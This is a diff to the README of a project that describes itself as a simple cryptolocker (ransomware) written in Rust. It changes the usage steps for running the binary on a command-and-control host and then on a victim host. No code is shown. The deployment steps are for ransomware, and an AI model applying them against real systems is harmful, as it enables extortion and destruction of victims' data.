@@ -16,5 +16,5 @@ A simple cryptolocker malware written in Rust
 
 ## Usage
 
-1. run the tetanus binary on the c2 host with the `lockjaw` argument
-2. run the tetanus binary on the victim host with the `nail=<c2 ip address>` argument
+1. run the tetanus binary on the c2 host with the `--nail` argument
+2. run the tetanus binary on the victim host passing the ip address of the c2 host as an argument
